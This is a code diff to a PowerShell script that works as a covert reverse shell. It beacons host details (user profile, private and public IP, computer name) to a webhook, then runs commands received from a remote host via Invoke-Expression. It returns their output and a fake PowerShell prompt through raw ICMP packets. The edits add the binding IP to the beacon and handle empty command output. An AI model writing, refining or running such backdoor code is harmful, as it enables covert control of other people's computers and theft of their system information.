@@ -5,10 +5,6 @@ $F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.
 [char]$EL = 14
 
 $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)
-if ($BindingIP.length -ge 2){
-  write-host true
-  $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)[0]
-}
 
 $pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
 $pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
@@ -34,8 +30,9 @@ function Send-Webhook {
   Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $json -ContentType "application/json"
 }
 $payload = @{
-  "ClientVer"       = "$($VERSION)"
+  "ClientVer"    = "$($VERSION)"
   "Prv-IP"       = "$((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)"
+  "Binding IP"   = "$($BindingIP)"
   "User"         = "$($env:USERPROFILE)"
   "Pub-IP"       = "$((Iwr -Uri "https://api.ipify.org").Content)"
   "ComputerName" = "$($env:ComputerName)"
@@ -91,8 +88,15 @@ while ($true) {
       }
   }
   elseif (((ret) -ne "H_IP") -and ((ret) -ne "Transfer")) {
+    $com = $null
     write-host PARSED: (ret)
-    $com = (Invoke-Expression -Command (ret)); $com = $com + "`n" + ($error[0] | Out-String); $error.clear()
+    $com = (Invoke-Expression -Command (ret)); if ($com -ne $null){
+    $com = $com + "`n" + ($error[0] | Out-String); $error.clear()
+    }
+    else {
+      $com = ""
+    }
+  
     $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($com + $EL)), $PingOptions)
     $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + "> " + $EL)), $PingOptions)
   }
